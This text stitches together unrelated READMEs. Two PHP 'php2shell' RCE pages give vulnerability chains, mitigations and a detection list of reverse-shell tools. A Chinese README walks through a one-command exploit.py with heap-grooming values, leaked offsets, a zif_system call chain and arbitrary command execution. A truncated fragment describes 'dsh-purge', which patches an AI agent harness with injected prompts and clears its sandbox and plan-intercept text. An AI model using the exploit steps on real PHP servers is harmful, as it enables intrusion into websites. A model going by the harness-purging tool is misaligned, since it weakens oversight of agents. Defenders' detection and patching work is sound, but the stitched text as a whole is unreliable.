items.readme:
php2shell

CVE-2026-109618 & CVE-2026-109619 — Independent Research & Verification

--- Two critical pre-authentication RCE vulnerabilities in PHP core, exploiting `session.upload_progress` (enabled by default) and the memory allocator's OOM bailout. **14 years of vulnerable code** (PHP 5.4.0, 2012 — present). **Author:** [Qi Deng](https://github.com/ikow)  |  **Writeup:** [qideng.substack.com](https://qideng.substack.com/p/php2shell-dissecting-phps-critical)  |  **Date:** 2026-10-21 ## Impact | What | Scale | |------|-------| | Websites running PHP | **78%** of all websites | | WordPress alone | **43%** of all websites | | Affected versions | PHP 5.4.0 through 8.5.11 (14 years) | | Authentication required | **None** | | Application vulnerability required | **None** (Chain D — mod_php) | ## Verified Attack Chains ### Chain A — Session File Injection + LFI → RCE Upload a file with PHP code in the filename → `session.upload_progress` stores it raw in the session file → include via any LFI → code execution. ``` Conditions: upload_progress=On (default) + application has LFI Reliability: 100% ``` ### Chain B — var_destroy UAF → Handler Overwrite → RCE `var_destroy()` frees back-reference chunks then fires `__destruct` without `serialize_lock`. Inner `unserialize()` reuses the freed var_hash → heap-use-after-free → overwrite function handler → RCE. ``` Conditions: application calls unserialize() with controlled data ASAN: heap-use-after-free CONFIRMED at var_unserializer.c:851 ``` ### Chain C — Session Handler Mismatch → `__destruct` → RCE Session written with `php_serialize` handler (pipe `|` preserved in filename) → read by `php` handler → splits at `|` → deserializes injected object → `__destruct` fires during var_hash cleanup **even when decode returns FAILURE**. ``` Conditions: two directories with different session.serialize_handler Key finding: __destruct fires on BOTH success and failure paths ``` ### Chain D — mod_php OOM → Stale EG() → RCE ⚡ Multipart POST triggers OOM during request startup → `longjmp()` skips `init_executor` → Apache mod_php runs shutdown on stale `EG()` globals → use-after-free → RCE. ``` Conditions: NONE — any PHP endpoint on Apache mod_php SAPI: Apache mod_php ✅ | FPM ⚠️ (child exits) | FrankenPHP ✅ ``` **This is a pre-auth, zero-dependency RCE against default Apache mod_php installations.** ### Chain E — FPM Session OOM → Stale BG(unserialize) → RCE ⚡ Producer request: `session_start()` decodes ~30MB session → OOM during `php_var_unserialize` → `BG(unserialize).level` stays >0, session destruction state dirty → FPM worker **survives**. Consumer request: `upload_progress` triggers `rfc1867` handler (runs **before** `PHP_RINIT_FUNCTION(basic)`) → accesses stale `BG(unserialize)` → "Session object destruction failed" → `__destruct` on stale objects → UAF → RCE. ``` Conditions: session_start() endpoint + large session file + FPM Key finding: rfc1867 runs BEFORE basic_rinit — stale BG(unserialize) is accessible Verified: "Session object destruction failed" during PHP Request Startup ``` ## Official CVE Details | CVE | GHSA | Description | |-----|------|-------------| | CVE-2026-109618 | [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) | RCE via OOM corruption — `longjmp()` leaves request state invalid | | CVE-2026-109619 | [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) | RCE via stale global state — worker retains freed request memory | **Patch:** [Commit 3584a98](https://github.com/php/php-src/commit/3584a98bda) — 300 files changed, replaces `longjmp()` with delayed soft OOM + hard `_exit()`. ## Quick Start ```bash # Clone git clone https://github.com/ikow/php2shell-poc.git && cd php2shell-poc # Start lab (PHP-FPM + nginx + Apache mod_php) cd lab && docker compose up -d # Verify Chain A: Session injection python3 ../poc/verify_session_injection.py --target http://127.0.0.1:18080 # Verify Chain B: UAF (requires ASAN build) USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php ../poc/verify_uaf_asan.php # Verify Chain C: Handler mismatch python3 ../poc/verify_handler_mismatch.py --target http://127.0.0.1:18080 # Verify Chain D: OOM on Apache mod_php python3 ../poc/verify_oom_trigger.py --host 127.0.0.1 --port 18081 --strategy headers # Verify Chain E: FPM stale BG state python3 ../poc/verify_fpm_stale_state.py --target http://127.0.0.1:18080 ``` ## Repository Structure ``` php2shell-poc/ ├── README.md ├── poc/ │ ├── verify_session_injection.py # Chain A: session file injection │ ├── verify_uaf_asan.php # Chain B: var_destroy UAF (ASAN) │ ├── verify_handler_mismatch.py # Chain C: handler mismatch │ ├── verify_oom_trigger.py # Chain D: OOM trigger strategies │ └── verify_fpm_stale_state.py # Chain E: FPM stale BG verification ├── lab/ │ ├── docker-compose.yml # FPM + nginx + Apache mod_php │ ├── setup.sh # One-click lab setup │ ├── php.ini # FPM configuration │ └── php-apache.ini # Apache mod_php (low memory for OOM) └── docs/ ├── ANALYSIS.md # Full technical analysis └── cover.png # Cover image ``` ## Mitigation ```ini ; Immediate — reduces attack surface but does NOT fix all chains session.upload_progress.enabled = Off session.use_only_cookies = On ``` | Mitigation | Chains blocked | |-----------|---------------| | `session.upload_progress.enabled = Off` | A, C, E (partial) | | `session.use_only_cookies = On` | A, C (session fixation) | | `memory_limit` + `post_max_size` tuning | D (reduces OOM surface) | | Update to PHP 8.2.35+ | **All chains** | > **The only complete fix is patching PHP.** The OOM corruption (Chain D) is in the Zend engine core, not in session handling. ## Timeline | Date | Event | |------|-------| | 2012-03-01 | `session.upload_progress` introduced in PHP 5.4.0 | | 2026-10-20 | Details leaked before embargo; PHP advances release | | 2026-10-21 | PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 released | | 2026-10-21 | This research published | ## References - [PHP Security Advisory](https://www.php.net/archive/2026.php) - [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) — CVE-2026-109618 - [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) — CVE-2026-109619 - [Patch commit](https://github.com/php/php-src/commit/3584a98bda) — 300 files, Zend engine + extensions - [PR #22113](https://github.com/php/php-src/pull/22113) — Session fixation fix - [BleepingComputer coverage](https://www.bleepingcomputer.com/news/security/php-ships-emergency-patches-for-critical-php2shell-flaws/) ## Disclaimer This repository contains **verification POCs only** — tools to confirm whether a system is vulnerable. No weaponized exploits are included. Full exploit code is available to [paid subscribers](https://qideng.substack.com/p/php2shell-dissecting-phps-critical). For authorized security testing and educational purposes only. ## License MIT

items.readme: # php2shell — CVE-2026-109618 / CVE-2026-109619 > **Critical Advisory (CVSS v4.0: 9.2 - Critical):** On October 20, details of two pre-auth Remote Code Execution (RCE) flaws in the PHP core leaked online ahead of coordinated disclosure. Exploitation allows arbitrary command execution straight from the web server. --- ## Table of Contents - [Overview](#overview) - [Root Cause](#root-cause) - [Verification & Targets](#verification--targets) - [Affected PHP Versions](#affected-php-versions) - [Threat Landscape & Detection Guidance](#threat-landscape--detection-guidance) - [Behavioral Indicators & Suspicious Child Processes](#behavioral-indicators--suspicious-child-processes) - [Monitoring Recommendation](#monitoring-recommendation) - [Action Items for Organizations](#action-items-for-organizations) - [Proof of Concept (PoC)](#proof-of-concept-poc) - [Mitigation & Source Patching](#mitigation--source-patching) - [1. Configuration Mitigation (Immediate Stopgap)](#1-configuration-mitigation-immediate-stopgap) - [2. Automated Quick-Fix Script](#2-automated-quick-fix-script) - [3. Source Code Patch (`session-upload-progress-counters.patch`)](#3-source-code-patch-session-upload-progress-counterspatch) - [4. Cloudflare WAF Custom Rules](#4-cloudflare-waf-custom-rules) - [5. FrankenPHP Caddyfile Configuration](#5-frankenphp-caddyfile-configuration) - [6. Lighttpd Configuration](#6-lighttpd-configuration) - [7. Apache Mitigation (ModSecurity & .htaccess)](#7-apache-mitigation-modsecurity--htaccess) - [Disclaimer](#disclaimer) --- ### Overview `php2shell` refers to two critical vulnerabilities (CVE-2026-109618 & CVE-2026-109619) affecting core PHP functionality. The primary demonstrated vector is a heap use-after-free (UAF) in the PHP core session upload progress mechanism leading to arbitrary code execution (`zend_call_function` / `system()`). - **Severity:** Critical (CVSS v4.0: 9.2) - **Impacted Versions:** Reports indicate PHP versions 5, 6, 7, and 8 may be affected. Fixes are primarily expected for currently supported PHP 8 branches, leaving end-of-life (EOL) versions (PHP 5.x, 7.x, 8.0, 8.1) exposed without official vendor patches. - **Industry Tracking:** Confirmed by security researchers (watchTowr reproduced CVE-2026-109618; monitoring by Huntress and Florian Roth / process-watcher). #### Root Cause PHP's upload progress handler (`php_session_rfc1867_callback` in `ext/session/session.c`) stores two raw `zval *` bucket pointers (`post_bytes_processed` and `current_file_bytes_processed`) directly in live `HashTable` structures. During request processing: 1. **Trigger:** A standard multipart `POST` request activates progress tracking with default configuration values (`session.upload_progress.enabled = 1`). 2. **Free:** A progress update cycle re-reads session data. The function `zend_hash_update()` destroys the previous data tree using the destructor `zval_ptr_dtor`, freeing the memory block. 3. **Reclaim:** The freed bucket memory is reclaimed. The dangling pointer is redirected to crafted `zend_fcall_info` and `zend_internal_function` structures. 4. **Execution:** PHP calls `zend_call_function()`, resulting in arbitrary system command execution. #### Verification & Targets - Confirmed on standard `php-src` builds (including versions 8.4.4 and 8.2.34). - Uses symbol offsets (`--syms`) between `zval_ptr_dtor` and `zend_call_function` to adapt to distribution-specific binary layouts (e.g., Debian Bookworm, Ubuntu Noble, Ubuntu Jammy). --- ### Affected PHP Versions The following table summarizes the PHP versions affected by **CVE-2026-109618** and **CVE-2026-109619**, along with their support and patch statuses: | PHP Branch | Status | Affected Versions | Fixed / Secure Version | Notes | | :--- | :--- | :--- | :--- | :--- | | **PHP 8.5** | Supported (Active) | < 8.5.12 | **8.5.12** | Emergency security release published | | **PHP 8.4** | Supported (Active) | < 8.4.27 | **8.4.27** | Emergency security release published | | **PHP 8.3** | Supported (Active) | < 8.3.36 | **8.3.36** | Emergency security release published | | **PHP 8.2** | Supported (Security Only) | < 8.2.35 | **8.2.35** | Emergency security release published | | **PHP 8.1** | End of Life (EOL) | All 8.1.x versions | No Official Patch (EOL) | Set `session.upload_progress.enabled = Off` or use ELS/distro backports | | **PHP 8.0** | End of Life (EOL) | All 8.0.x versions | No Official Patch (EOL) | Official support ended; configuration mitigation is mandatory | | **PHP 7.x** | End of Life (EOL) | All 7.0 - 7.4 versions | No Official Patch (EOL) | Core `ext/session` logic vulnerable; urgent mitigation or upgrade required | | **PHP 5.x** | End of Life (EOL) | 5.4.0+ (with RFC1867 progress tracking) | No Official Patch (EOL) | Official support ended; isolate host or disable upload progress | > [!WARNING] > PHP 8.1 and older End-of-Life (EOL) versions **do not receive** official security patches from the PHP Foundation. For these environments, immediately apply [`session.upload_progress.enabled = Off`](#1-configuration-mitigation-immediate-stopgap) or rebuild PHP from source using the provided C source patch. --- ### Threat Landscape & Detection Guidance Exploitation of `php2shell` typically manifests as anomalous child processes spawned directly by PHP worker processes (`php-fpm`, `php-cgi`, `php-cgi.exe`, `httpd`, `apache2`). #### Behavioral Indicators & Suspicious Child Processes Monitor and alert on PHP worker processes executing: - **Interactive Shells:** `/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe` - **Script Interpreters:** `python`, `perl` - **Network / Transfer Utilities:** `curl`, `wget`, `nc`, `certutil.exe` - **Common Reverse Shell Patterns:** `/dev/tcp/`, `fsockopen`, `mkfifo` - **Immediate Reconnaissance Commands:** `whoami`, `id`, `uname -a`, `ipconfig` #### Monitoring Recommendation For Linux-based web environments without an endpoint detection agent, tools like Florian Roth's free [process-watcher](https://github.com/Neo23x0/process-watcher) can be run in observe mode to flag unusual child process spawning in real time. --- ### Action Items for Organizations 1. **Inventory All PHP Environments:** - Public-facing web servers running applications like WordPress, Drupal, Joomla, or Magento. - Internal appliances, hosting panels (cPanel, Plesk), and bundled standalone binaries (`php.exe`, `php-cgi.exe`). 2. **Prepare for Patch Windows:** - Official emergency patches from PHP and downstream Linux distributions are scheduled for release around **Wednesday, October 21 at 14:00 UTC (10:00 AM ET)**. - Apply vendor updates immediately once released. 3. **Isolate End-of-Life (EOL) Installations:** - Environments running unsupported versions (PHP 5.x, 7.x, 8.0, 8.1) may not receive official upstream backports. - Restrict access via VPN, apply strict WAF rules, or disable public internet exposure. 4. **Incident Response & Investigation:** - If suspicious child processes or unexpected files are detected, isolate the host and preserve web server/PHP logs. - Inspect web roots and temporary directories (`/tmp`, `/var/tmp`) for dropped webshells or transient execution artifacts. --- ### Proof of Concept (PoC) This repository is dedicated to security research and Proof-of-Concept (PoC) development for **php2shell (CVE-2026-109618 / CVE-2026-109619)**. The PoC exploit is currently being developed and tested. The code will be published in this repository very soon. ⭐ **Star this repository** to stay updated on the upcoming PoC release. --- ### Mitigation & Source Patching Until official vendor packages are updated in your repositories, you can protect your environments using configuration changes, automated scripts, or by compiling PHP with the included source patch. #### 1. Configuration Mitigation (Immediate Stopgap) The vulnerability relies on PHP's session upload progress mechanism (`session.upload_progress.enabled`), which is enabled by default. Disabling this directive neutralizes the attack vector while preserving regular file upload functionality: In your `php.ini`: ```ini session.upload_progress.enabled = Off ``` Or for PHP-FPM pool configurations (e.g., `/etc/php/*/fpm/pool.d/www.conf`): ```ini php_admin_flag[session.upload_progress.enabled] = off ``` After modifying the configuration, reload/restart your web services (e.g. `systemctl reload php-fpm` or `systemctl reload apache2`). #### 2. Automated Quick-Fix Script A mitigation helper script is available under the [`quick-fix/`](quick-fix/) directory: - **Check Current Status:** ```bash sudo ./quick-fix/run.sh --check ``` - **Apply Mitigation (Dry Run):** ```bash sudo ./quick-fix/run.sh --dry-run ``` - **Apply Mitigation:** ```bash sudo ./quick-fix/run.sh ``` - **Revert Changes:** ```bash sudo ./quick-fix/run.sh --revert ``` #### 3. Source Code Patch (`session-upload-progress-counters.patch`) If you build PHP from source or maintain custom distribution packages, a C-level source patch is provided under [`patch/session-upload-progress-counters.patch`](patch/session-upload-progress-counters.patch). **What the patch fixes:** The patch resolves the root cause in `ext/session/session.c` and `ext/session/php_session.h`. Instead of maintaining vulnerable, raw `zval *` bucket pointers (`post_bytes_processed` and `current_file_bytes_processed`) into dynamic `HashTable` structures (which become dangling pointers when the hash table is cleared or re-allocated during upload progress updates), the patch: - Stores counters as direct `zend_long` primitives. - Introduces `php_session_rfc1867_sync_counters()` to safely resolve and update array entries without dangling references. **How to Apply the Patch:** 1. Navigate to the root of your `php-src` source directory: ```bash cd /path/to/php-src ``` 2. Test applying the patch (dry-run): ```bash # Using git (if building from a git clone) git apply --check /path/to/patch/session-upload-progress-counters.patch # OR using GNU patch patch -p1 --dry-run < /path/to/patch/session-upload-progress-counters.patch ``` 3. Apply the patch: ```bash # Using git git apply /path/to/patch/session-upload-progress-counters.patch # OR using GNU patch patch -p1 < /path/to/patch/session-upload-progress-counters.patch ``` 4. Recompile and install PHP: ```bash ./buildconf --force # if needed ./configure make -j"$(nproc)" sudo make install ``` 5. Restart your PHP runtime / web services: ```bash sudo systemctl restart php-fpm # or sudo systemctl restart apache2 ``` ##### Community Backports for EOL Versions (PHP 5.6, 7.4, 8.0, 8.1) For legacy systems that cannot immediately upgrade to supported PHP 8.2+ releases (e.g. legacy OpenCart, WordPress, or control panels running on PHP 5.6, 7.4, 8.0, or 8.1), dedicated backports combining the official PHP Group OOM fix with the root-cause counter sync are available: - 👉 **Repository:** [Anton-Barinov/php2shell-patches](https://github.com/Anton-Barinov/php2shell-patches) - Includes automated build scripts to compile isolated, side-by-side runtimes into `/opt/php--patched` without overwriting system packages, plus multi-PHP FPM pool hardening tools. #### 4. Cloudflare WAF Custom Rules Recommended Cloudflare WAF rule templates to filter malicious traffic are located in the [`cloudflare-rule-fix/`](cloudflare-rule-fix/) directory: - **Comprehensive multipart blocking (excluding legitimate upload routes)** - **Enterprise plan `PHP_SESSION_UPLOAD_PROGRESS` request body inspection** - *Note: Blocking requests based solely on the `PHPSESSID` cookie is strongly discouraged as it breaks valid user sessions.* Refer to [cloudflare-rule-fix/README.md](cloudflare-rule-fix/README.md) for full rule syntax and details. #### 5. FrankenPHP Caddyfile Configuration To disable the session upload progress mechanism globally in FrankenPHP environments, a Caddyfile snippet is provided. Add the contents of [`frankenphp/Caddyfile-snippet`](frankenphp/Caddyfile-snippet) to your global Caddyfile block: ```caddyfile { frankenphp { php_ini session.upload_progress.enabled 0 } } ``` #### 6. Lighttpd Configuration For environments running Lighttpd, you can block multipart requests (`POST`, `PUT`, `PATCH`) on virtual hosts or directories that do not accept file uploads using [`lighttpd/php2shell.conf`](lighttpd/php2shell.conf): ```lighttpd $HTTP["request-method"] =~ "^(POST|PUT|PATCH)$" { $REQUEST_HEADER["Content-Type"] =~ "(?i)^\s*multipart/form-data([;,[:space:]]|$)" { url.access-deny = ( "" ) } } ``` #### 7. Apache Mitigation (ModSecurity & .htaccess) Two mitigation options are provided for Apache environments: - **ModSecurity Rule:** Block requests containing the `PHP_SESSION_UPLOAD_PROGRESS` parameter using [`apache/modsecurity-php2shell.conf`](apache/modsecurity-php2shell.conf): ```apache SecRequestBodyAccess On SecRule ARGS_NAMES "@streq PHP_SESSION_UPLOAD_PROGRESS" \ "id:1026109618,phase:2,t:none,deny,status:403,log,\ msg:'php2shell: PHP_SESSION_UPLOAD_PROGRESS field blocked (CVE-2026-109618/109619)'" ``` - **`.htaccess` / mod_rewrite Rule:** For directories that do not require file uploads, block multipart requests before they reach the PHP interpreter using [`apache/.htaccess`](apache/.htaccess): ```apache RewriteEngine On RewriteCond %{REQUEST_METHOD} ^(POST|PUT|PATCH)$ [NC] RewriteCond %{HTTP:Content-Type} ^[[:space:]]*multipart/form-data([;,[:space:]]|$) [NC] RewriteRule ^ - [F,L] ``` --- ### Disclaimer This project is intended strictly for educational purposes and authorized security research. Use only in environments you own or have explicit permission to test.

items.readme:
# php2shell — PHP 8.4.26 session 漏洞复现

中文 | [English](readme_en.md)

在“完全远程、只用 HTTP、目标页面无 `session_start()`、不写任何目标侧 PHP”的约束下，用**一个 `exploit.py`** 打通 PHP 8.4.26 + Apache prefork + mod_php 的 RCE。官方 `php:8.4.26-apache` 镜像已实测 **3/3** 一键成功（`PROOF: uid=33(www-data)...`）。当前版本要求 `display_errors=1`；`display_errors=0` 已打通纯 HTTP 堆泄漏，完整 RCE 稍后提交。

## exp

下面是从零到 RCE 的完整命令，整段复制执行即可。本仓库不编译 PHP/Apache，没有 `docker build`：环境就是官方 `php:8.4.26-apache` 镜像加 `docker/` 下的配置挂载。

```bash
# 依赖：Docker Engine/Desktop + Docker Compose v2 + Python 3.9+
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 拉官方镜像（PHP 8.4.26 / Debian 12 / Apache prefork）
docker compose -f docker/docker-compose.yml pull

# 2) 起目标：单 worker、display_errors=On、memory_limit=8M
docker compose -f docker/docker-compose.yml up -d

# 3) 等 Apache 就绪并确认普通页面
for i in $(seq 1 20); do
  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
  sleep 0.5
done
curl -s http://127.0.0.1:8088/index.php   # OK

# 4) 一条命令完成整个利用；首次运行会自动读取 libphp 偏移
python3 exploit.py -u http://127.0.0.1:8088/index.php
# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 已经在仓库目录内就跳过 `git clone`/`cd`；`pull` 也可以省略，`up -d` 会自动拉镜像。

`exploit.py` 自动完成 worker 轮换、两阶段泄漏、`zif_system` 执行和 proof 读取，每个阶段内置重试。运行环境：

| 组件 | 版本 | 来源 |
|---|---|---|
| PHP | 8.4.26（NTS，mod_php） | `php:8.4.26-apache` |
| 基础系统 | Debian 12 (bookworm) | 同上 |
| Apache | 2.4.69（官方镜像内 Debian 12 包，实测） | 同上 |
| MPM | prefork，单 worker | [docker/apache.conf](docker/apache.conf) |
| lab 报告中的 Apache | 2.4.68（原 lab 自编译，`--profile lab`） | 若需完全一致，用 [apache/httpd](https://github.com/apache/httpd) 的 2.4.68 tag |

官方镜像仓库：[docker-library/php](https://github.com/docker-library/php)（Docker Hub: [`php:8.4.26-apache`](https://hub.docker.com/_/php)）；PHP 源码：[php/php-src](https://github.com/php/php-src)（tag `php-8.4.26`）。

首次运行会自动执行 [docker/offsets.py](docker/offsets.py)：从容器内 `libphp.so` 读取 `zif_system` / `zval_ptr_dtor` 的真实偏移并写入 `out/offsets.env`，`exploit.py` 自动加载，所以更换官方镜像或升级后不用手改偏移。默认命令是 `id>/out/p1`（10 字节），容器里的 `/out` 挂载到仓库的 `./out`，proof 直接落在本机：

```text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] no offsets file; reading libphp symbols from container php2shell-target
zif_system     0x...
zval_ptr_dtor  0x...
[+] chunk base = 0x...
[+] libphp base = 0x...
[*] stage 3: HTDATA=0x... ZIF=0x...
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

payload 里的命令上限是 **14 字节**。要跑任意命令，把脚本写到挂载目录，再用 `sh</out/c`（8 字节）执行：

```bash
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
```

常用参数：`--profile`、`--cmd`、`--proof-file`、`--fetch`、`--zif-offset`、`--dtor-offset`、`--htdata-offset`、`--no-pre-rotate`、`--retries`。默认 profile 是 `bookworm`（官方镜像）；原 lab 构建用 `--profile lab`。`--offsets-file ''` 可关闭自动读取，容器名不是 `php2shell-target` 时用 `--docker-container` 指定。

bookworm 的堆标定已内置：stage1 filler 数 **841**；stage2 目标数组 **406**、元素值长度 **16**；stage3 `HTDATA=chunk+0x690d8`，A 的 pad 为 6×(31,31)，并额外带 32 字符合法 `Cookie: PHPSESSID`，使 B 复用 stale id（`send_cookie=0`），避免 session 的 `Set-Cookie` 头在 `R0+16` 覆盖 `val.type`；B 用 15B carrier 覆盖 reference 的 `val.value`。官方镜像的 libphp 偏移自动读取为 `zif_system=0x465370`、`zval_ptr_dtor=0x65eb60`；原 lab 用 `0x43a870` / `0x613c50`。

## 机制概览

漏洞面是 `session.upload_progress` 在 RINIT 之前触发的 session 初始化，以及 OOM bailout 后跨请求残留的悬空指针。下面以 lab 构建为例；官方镜像的 bookworm 标定值见 exp 末尾。

整条链的攻击流量全部是普通 multipart HTTP，目标页面只有 `<?php echo "OK\n"; ?>`：

0. **worker 轮换**：`A_bigfields`（3MB 存活 POST 字段 + 12MB OOM）后紧跟一个会初始化 session 的 B，child 以 SIGABRT 退出；prefork fork 出的新 worker 继承相同的 libphp/chunk 映射。
1. **堆泄漏**：A 用 1001 个字段触发 `max_input_vars` 警告（`display_errors=On` → `headers_sent=1`），`PHPSESSID=\x00` 生成新 id 并置 `send_cookie=1`，最后的 12MB 字段在 `php_session_initialize()` 内 OOM，`PS(http_session_vars)` 悬空。B 用 56B multipart 原始值缓冲区重占旧 reference，并用存活的 192B zend_string 承载 fake HashTable；`php_url_encode()` 越界读把 Zend MM chunk 指针写进 `Set-Cookie`（4096B、98 个指针）。
2. **libphp 泄漏**：A 把悬空 `PS(id)` 放到 `chunk+0xb7400`；B 的 56B HashTable 页让 `ZSTR_LEN(PS(id))` 读到 `nTableSize=16`，数据区正好是 `nNextFreeElement|pDestructor`；`pDestructor = ZVAL_PTR_DTOR = libphp+0x613c50`，从 `Set-Cookie` 解出 libphp base。
3. **命令执行**：A 用 6 个 pad 把悬空 reference 固定到 `R0=chunk+0x24e0`；B 用 55B raw buffer 覆盖 `R0-0x10`，fake HashTable 放在 `chunk+0x6e0d8` 的 167B 存活字符串里，`pDestructor = zif_system = libphp+0x43a870`。触发链：

   ```text
   php_session_track_init()
     zval_ptr_dtor(PS(http_session_vars))
       zend_reference_destroy(R0)
         zval_ptr_dtor(&ref->val)          # IS_ARRAY_EX
           zend_array_destroy(fake HT)
             zend_hash_destroy(fake HT)
               pDestructor(&bucket->val)   # zif_system
   ```

   终端只使用 libphp 内的 `zif_system`，不需要 libc。

## 机制分析

- **页面为什么不需要 `session_start()`**：A/B 的 session 初始化发生在 RINIT 前的 multipart 回调里（`FILE_START → php_session_rfc1867_update → php_session_initialize()`；`END → php_session_rfc1867_cleanup → php_session_initialize()`），与脚本内容无关。
- **指针为什么会悬空**：A 在 `php_session_initialize()` 内 OOM bailout，`PS(http_session_vars)` / `PS(id)` 没有被清空；下一个请求初始化 session 时 `php_session_track_init()` 对它执行 `zval_ptr_dtor`。
- **为什么能重占**：multipart 普通字段的值在请求解析阶段被分配成 zend_string；56B block、55B reference、167B 字符串这些尺寸正好覆盖旧 reference、承载 fake HashTable。
- **为什么能过 ASLR**：两次 `Set-Cookie` 越界读分别给出 chunk base 和 libphp base；阶段之间用纯 HTTP abort/fork 换 worker，地址空间不变；终端不依赖 libc。
- **历史线**：`session_unset()` + 用户态 `__destruct` 的 Defect D（`arData` UAF）已在自定义 PHP 页面取得 RCE（[NOASLR_REPORT.md](NOASLR_REPORT.md)），但违反“不写特定 PHP”约束，仅作机制参考。

地址/偏移（相对 chunk 或 libphp，与 ASLR 无关）：

| 位置 | 含义 |
|---|---|
| `chunk+0xb7400` | 阶段 2 悬空 `PS(id)` |
| `chunk+0xb73f0` | 阶段 2 目标 HashTable（`a0443`） |
| `chunk+0x6e0d8` | 阶段 3 fake HashTable 字符串数据 |
| `chunk+0x24e0` | 阶段 3 悬空 reference `R0` |
| `libphp+0x613c50` | `ZVAL_PTR_DTOR` |
| `libphp+0x43a870` | `zif_system` |

上表是 lab 构建（`--profile lab`）。官方镜像（默认 `--profile bookworm`）的对应标定为：stage1 filler 数 **841**；stage2 目标数组 **406**、元素值长度 **16**；stage3 `HTDATA=chunk+0x690d8`，A pad 6×(31,31) 并带 32 字符合法 `Cookie: PHPSESSID`，B 用 15B carrier；libphp 偏移由 `docker/offsets.py` 自动读取（`0x465370` / `0x65eb60`）。

详细机制、gdb 证据与请求校准见 [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)（堆泄漏）、[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)（libphp 泄漏与全链）、[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md)（不依赖 `display_errors` 的泄漏）、[NOTES.md](NOTES.md)（根因与源码位置）。

## 复现声明

- **一个 exp 复现全部**：`python3 exploit.py -u ...` 一条命令完成 worker 轮换、堆泄漏、libphp 泄漏和 `zif_system` 执行；不需要目标侧文件、不需要 `session_start()`、不需要本地信号。
- **纯 HTTP**：攻击流量只有 multipart POST，目标 webroot 只有 `<?php echo "OK\n"; ?>`。
- **环境**：官方 `php:8.4.26-apache`（PHP 8.4.26 / Debian 12 / Apache 2.4.69 prefork）+ [docker/php.ini](docker/php.ini)、[docker/apache.conf](docker/apache.conf)，默认 `--profile bookworm`，实测 **3/3**。原 lab 构建（Apache 2.4.68、最小 PHP）用 `--profile lab`；两套 profile 的 chunk 偏移和 stage3 触发方式已分别标定。
- **边界**：当前 RCE 要求 `display_errors=1`、`memory_limit=8M`、`max_input_vars=1000`、`session.use_cookies=1`、`session.use_strict_mode=0`、单 worker prefork；`display_errors=0` 的完整 RCE 稍后提交。
- 仅用于授权环境中的漏洞研究与复现。

Rule sets sit in a list above the editor, with Enable and Delete on each row. The first time you open Drill you read the notice, wait out the countdown, scroll to the end, and check three boxes. Runtime files live under `$DSH_HOME`: `prompt-inject.md`, `rules/`, `skills/`, `net-scope-allow.txt`, `redteam/`. If `DSH_HOME` is unset, the launcher-adjacent `.dsh` wins over `~/.dsh`. Web and the desktop app each use their own home. Skills are not part of the inject section and do not replace the prompt. --- ## Usage ```sh dsh-purge --status dsh-purge --apply dsh-purge --revert dsh-purge --uninstall dsh-purge --edit /purge status | apply | revert | uninstall | edit | help /rules list | use | create | delete | reset | help /skills list | import | create [description] | delete | help /rewind purge_status purge_apply purge_revert ``` After a successful Apply, the host restarts so patched packages load; you can also click **Restart** manually. Under the patch title are the stable release and the test release. The test release follows the `beta` branch. **Switch to stable** installs `master` and clears any pin. Picking an older stable version pins it; click **Update** to return to the latest. Old test tags are not listed. The composer **Undo once** and **Undo last round** follow official DSH `session.fork({ atSeq })`: the withdrawn turn is cut off, a new session keeps the earlier context, the old session is archived, and the line returns to the input so **send again** re-injects. `/rewind` does the same. If the **same task works in standard but fails in minimal or PTC**, preset `run_code`, sandbox, or plan intercept text is often still uncleared, or built-in minimal is missing `agent-instructions`. Use **1.1.61+**, then **quit the host fully → Apply in Clean → restart → start a new chat**. Switching preset alone does not reload patches in the running process. ### Response speed DSH runs Bash calls in a tool batch one at a time. Older dsh-purge releases raised the default foreground wait from 60 seconds to 10 minutes, so one slow command could hold up later calls for that long. Patch #21 now restores marked plugin values to the official 60-second default. Unmarked timeouts and other custom values are preserved; an unmarked 10-minute value cannot reliably be distinguished from a user setting. For a shorter wait in `dsh web` on macOS/Linux, add this entry to `$DSH_HOME/profiles/web/cordis.patch.yml` (normally `~/.dsh/profiles/web/cordis.patch.yml`). Edit an existing entry with the same id instead of adding a duplicate. This profile layer is applied after the bundled configuration, so future plugin applies keep the override. ```yaml - id: bash-sandbox config: timeoutMs: 10000 ``` With the standard jobs service and `promoteOnTimeout: true`, an unfinished command returns a background job id after 10 seconds and keeps running. Read it with `job_output` or stop it with `job_kill`. This changes the foreground wait, not the command's speed. Without that service or with promotion disabled, the timeout kills the command. A per-call `timeoutMs` overrides this default; `run_in_background: true` returns a job id immediately. For routine tasks, you can also opt into Low reasoning for new sessions: ```yaml - id: agent-default-model config: provider: deepseek-official model: deepseek-flash reasoningEffort: low ``` Restart `dsh web` to load the profile. The model and reasoning defaults apply to newly created sessions; select Low in the composer for an existing session. The plugin does not change these model preferences automatically. Keep High when the task needs deeper reasoning, and narrow file searches rather than recursively scanning every application directory. ### Own servers Addresses in mainland China, Hong Kong, and Macau stay forbidden unless that one host was registered first. Saying “this is my server” in chat does not allow it. A key or a password does not allow it either. The box sits under Prompt. If the dock does not show it yet, quit DeepSeek Harness completely and open it again. 1. Click **dsh-purge** beside the session title and stay on **Clean**. 2. Scroll past **Prompt**. **Own servers** is the next block. 3. Put one host on each line, in one of these forms: - `203.0.113.10` — one IP. - `my-vps.example.com` — one exact hostname. After you 